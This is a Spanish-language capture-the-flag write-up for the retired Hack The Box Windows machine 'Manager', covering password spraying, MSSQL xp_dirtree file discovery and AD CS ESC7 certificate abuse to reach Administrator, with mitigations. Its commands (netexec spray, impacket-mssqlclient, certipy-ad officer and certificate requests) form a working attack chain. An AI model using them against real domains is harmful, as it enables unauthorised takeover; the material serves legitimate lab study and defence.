---
machine: Manager
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, mssql, adcs, esc7, privesc]
---

# Manager — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un ciclo de RIDs y Kerberos enumera usuarios; un spray con el nombre de usuario como contraseña acierta en `operator`. `operator` accede a MSSQL y `xp_dirtree` permite leer un backup de la web con credenciales de `raven`. `raven` tiene derechos sobre AD CS y la mala configuración ESC7 permite emitir un certificado de Administrator y entrar por WinRM.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,80,88,389,445,1433,5985 <IP>
```

- El host es un controlador de dominio: DNS, Kerberos, LDAP, SMB, MSSQL y WinRM.
- El dominio es `manager.htb` y el DC `dc01.manager.htb`.
- `80` sirve un sitio corporativo con vhosts.

## Enumeración

- `netexec smb <IP>` obtiene el nombre de dominio y los usuarios por RID cycling.
- También se puede hacer Kerberos brute force con `kerbrute`.
- Un spray con `usuario:usuario` valida las credenciales de `operator`.

```bash
netexec smb <IP> -u users.txt -p users.txt --no-brute
```

## Foothold

`operator` puede autenticarse en MSSQL. `xp_dirtree` se usa para listar directorios y encontrar un backup del sitio web; el ZIP contiene un `web.config` antiguo con credenciales de `raven`.

```bash
impacket-mssqlclient manager.htb/operator:'<PASSWORD>'@<IP>
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

## Movimiento lateral

Con `raven` se enumera AD CS y se comprueba que tiene `ManageCA` o `ManageCertificates` sobre la CA, la condición de ESC7. Se añade a `raven` como oficial y se aprueba una petición de certificado con un SAN de Administrator.

```bash
certipy-ad find -u raven@manager.htb -p '<PASSWORD>' -dc-ip <IP> -vulnerable
certipy-ad ca -u raven@manager.htb -p '<PASSWORD>' -ca MANAGER-CA -add-officer raven
```

## Escalada de privilegios

Se solicita un certificado como Administrator, se aprueba con el rol de oficial y se usa PKINIT para obtener el TGT. Con `PassTheTicket` se entra por WinRM como Administrator.

```bash
certipy-ad req -u raven@manager.htb -p '<PASSWORD>' -ca MANAGER-CA -template User -upn administrator@manager.htb
certipy-ad ca -u raven@manager.htb -p '<PASSWORD>' -ca MANAGER-CA -issue-request <ID>
```

## Evidencia

- RID cycling y usuarios del dominio.
- Spray `usuario:usuario` y credenciales de `operator`.
- `xp_dirtree` y backup con `raven`.
- ESC7, certificado de Administrator y WinRM.

## Lecciones aprendidas

- Las contraseñas iguales al nombre de usuario siguen siendo comunes.
- `xp_dirtree` permite explorar el sistema de archivos sin `xp_cmdshell`.
- ESC7 convierte permisos de gestión de CA en Domain Admin.

## Mitigación y detección

- Aplicar políticas de contraseñas y bloquear sprays.
- Restringir `xp_dirtree` y los permisos de MSSQL.
- Auditar `ManageCA`/`ManageCertificates` y las plantillas de AD CS.

## Referencias

- [0xdf — Manager](https://0xdf.gitlab.io/2024/03/16/htb-manager.html)
- [IppSec — Manager](https://www.youtube.com/watch?v=lT2Tv0m4k7M)
- [Hack The Box — Manager](https://app.hackthebox.com/machines/manager)
